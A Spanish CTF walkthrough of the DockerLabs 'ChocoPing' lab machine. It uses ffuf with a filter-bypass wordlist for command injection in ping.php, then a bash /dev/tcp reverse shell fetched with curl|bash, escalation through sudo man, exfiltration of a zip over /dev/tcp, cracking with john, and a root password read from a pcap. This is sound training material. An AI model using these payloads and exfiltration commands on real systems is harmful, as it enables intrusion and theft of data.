---
icon: flag
---

# ChocoPing DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip chocoping.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh chocoping.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 10:44 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000038s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 1.0K  2025-04-05 11:13  ping.php
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
```

Veremos que solo hay un puerto `80` en el que tiene alojado un archivo llamado `ping.php` si intentamos entrar en el veremos el siguiente texto:

```
Por favor, ingresa una IP válida.
```

Vamos a realizar un poco de `fuzzing` para ver que parametro puede ser el que pueda enviar la `IP`.

## FFUF

```shell
ffuf -u 'http://<IP>/ping.php?FUZZ=/etc/passwd' -w <WORDLIST> -fs 34
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/ping.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 34
________________________________________________

ip                      [Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 9ms]
:: Progress: [20469/20469] :: Job [1/1] :: 74 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

Vemos que funciona con el parametro `ip`, por lo que vamos a probar lo siguiente:

```
URL = http://<IP>/ping.php?ip=<IP_ATTACKER>
```

Info:

```
PING 192.168.1.146 (192.168.1.146) 56(84) bytes of data.
64 bytes from 192.168.1.146: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 192.168.1.146: icmp_seq=2 ttl=64 time=0.058 ms
64 bytes from 192.168.1.146: icmp_seq=3 ttl=64 time=0.051 ms
64 bytes from 192.168.1.146: icmp_seq=4 ttl=64 time=0.053 ms

--- 192.168.1.146 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3094ms
rtt min/avg/max/mdev = 0.031/0.048/0.058/0.010 ms
```

Veremos que ha funcionado, como esto se esta realizando por el protocolo `ICMP` vamos a probar a dumpear la informacion que estamos recibiendo con la herramienta `tcpdump`.

Pero no veremos gran cosa, vamos a seguir realizando `fuzzing` para poder intentar realizar un `RCE` poniendo `;` pero si lo hacemos nos pondra `comando no permitido` por lo que vamos a probar a codificarlo en `URL` pero con la herramienta `FFUF`.

> bypasses.txt

```
/usr/bin/p?ng
nma? -p 80 localhost
/usr/bin/who*mi
touch -- -la
ls
/usr/bin/n[c]
'p'i'n'g
"w"h"o"a"m"i
\u\n\a\m\e \-\a
ech''o test
ech""o test
bas''e64
/\b\i\n/////s\h
echo whoami|$0
cat$u /etc$u/passwd$u
p${u}i${u}n${u}g
p$(u)i$(u)n$(u)g
w`u`h`u`o`u`a`u`m`u`i
!-1
mi
whoa
!-1!-2
{cat,lol.txt}
{echo,test}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b
IFS=,;`cat<<<cat,/etc/passwd`
echo${IFS}test
X=$'cat\x20/etc/passwd'&&$X
p\
i\
n\
g
$u $u
uname!-1\-a
```

```shell
ffuf -u "http://<IP>/ping.php?ip=<IP_ATTACKER>;FUZZ" -w bypasses.txt --enc 'FUZZ:urlencode' -fs 21
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/ping.php?ip=192.168.1.146;FUZZ
 :: Wordlist         : FUZZ: /home/kali/Desktop/bypasses.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 21
________________________________________________

p%5C                    [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 3ms]
n%5C                    [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 4ms]
X%3D%24%27cat%5Cx20%2Fetc%2Fpasswd%27%26%26%24X [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 4ms]
i%5C                    [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 4ms]
%5Cu%5Cn%5Ca%5Cm%5Ce+%5C-%5Ca [Status: 200, Size: 126, Words: 11, Lines: 2, Duration: 3251ms]
%2F%5Cb%5Ci%5Cn%2F%2F%2F%2F%2Fs%5Ch [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 4262ms]
:: Progress: [37/37] :: Job [1/1] :: 8 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Veremos que en esta linea de aqui:

```
%5Cu%5Cn%5Ca%5Cm%5Ce+%5C-%5Ca [Status: 200, Size: 126, Words: 11, Lines: 2, Duration: 3251ms]
```

Pone `Words: 11` por lo que sabemos que algo esta poniendo en la pagina, si probamos a utilizar dicho `payload`:

```
URL = http://<IP>/ping.php?ip=192.168.1.146;%5Cu%5Cn%5Ca%5Cm%5Ce+%5C-%5Ca
```

Info:

```
Linux b2e08b52d168 6.11.2-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.11.2-1kali1 (2024-10-15) x86_64 GNU/Linux
```

Vemos que se esta ejecutando de forma correcta, por lo que vamos a probar a utilizar la misma mecanica, pero para leer el archivo `passwd`.

```
URL = http://<IP>/ping.php?ip=<IP_ATTACKER>;\c\a\t+/e\t\c/p\a\s\s\w\d
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
balutin:x:1000:1000:balutin,,,:/home/balutin:/bin/bash
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
tcpdump:x:101:103::/nonexistent:/usr/sbin/nologin
```

Vemos que se esta volcando de forma correcta, por lo que vamos a realizar un `reverse shell`.

Vamos a generar el archivo `shell.sh` con la `reverse shell`:

> shell.sh

```bash
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Abriremos un servidor de `python` para que pueda coger el archivo.

```shell
python3 -m http.server 80
```

Vamos a realizar este comando:

```shell
curl -s http://192.168.1.146/shell.sh | bash
```

Cambiar la `IP` (`192.168.1.146`) por la vuestra, en mi caso quedaria algo asi:

```
URL = http://<IP>/ping.php?ip=<IP_ATTACKER>;\c\u\r\l+ -\s+ h\t\t\p://1\9\2.1\6\8.1.1\4\6/s\h\e\l\l.sh+|\b\a\s\h
```

Antes de ejecutarlo nos pondremos a la escucha de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos ese `payload` y volvemos a donde tenemos la escucha veremo lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [172.17.0.2] 58866
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@b2e08b52d168:/var/www/html$ whoami
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user balutin

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on 2f80b9197745:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on 2f80b9197745:
    (balutin) NOPASSWD: /usr/bin/man
```

Veremos que podemos ejecutar el binario `man` como el usuario `balutin` por lo que podremos hacer lo siguiente:

```shell
sudo -u balutin man man
!/bin/bash
```

Info:

```
balutin@2f80b9197745:/var/www/html$ whoami
balutin
```

Con esto ya seremos dicho usuario.

## Escalate Privileges

Si vamos a nuestra `home` veremos un archivo `.zip` el cual no podremos descomprimir ya que tiene contraseña, por lo que vamos a pasarnoslo a nuestra maquina `host` pero la maquina victima no tendra `python` por lo que tendremos que hacerlo de la siguiente forma:

```shell
cat ~/secretito.zip > /dev/tcp/<IP_ATTACKER>/<PORT>
```

En la maquina `host` pondremos lo siguiente:

```shell
nc -lvnp <PORT> > secretito.zip
```

Ahora enviamos el comando anterior estando a la escucha y veremos esto:

```
listening on [any] 7755 ...
connect to [192.168.1.146] from (UNKNOWN) [172.17.0.2] 44344
```

Con esto veremos que ha funcionado de forma correcta y veremos el archivo `secretito.zip` por lo que vamos a crackear la contraseña de la siguiente forma:

### zip2john

```shell
zip2john secretito.zip > hash.zip
```

```shell
john --wordlist=<WORDLIST> hash.zip
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (secretito.zip/traffic.pcap)     
1g 0:00:00:00 DONE (2025-04-12 03:36) 25.00g/s 102400p/s 102400c/s 102400C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado y abremos obtenido el `.pcap` vamos a ver que contiene:

```shell
unzip secretito.zip
```

Metemos como contraseña `chocolate` y veremos que se descomprimio de forma correcta, ahota si intentamos abrir el `.pcap` con `Wireshark` veremos que hay archivos corruptos, por lo que vamos a intentar ver los `strings` de dicho archivo:

```shell
strings traffic.pcap
```

Info:

```
POST /login HTTP/1.1
Host: ejemplo.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
username=root&password=secretitosecretazo!
GET /private HTTP/1.1
Authorization: Basic cm9vdDpTdXBlclNlY3JldDEyMyE=
Host: ejemplo.com
```

Veremos que contiene la `password` de `root` por lo que vamos a probarla en la maquina victima:

```shell
su root
```

Info:

```
root@2f80b9197745:/home/balutin# whoami
root
```

Metemos como contraseña `secretitosecretazo!` y veremos que funciono, por lo que habremos terminado la maquina.
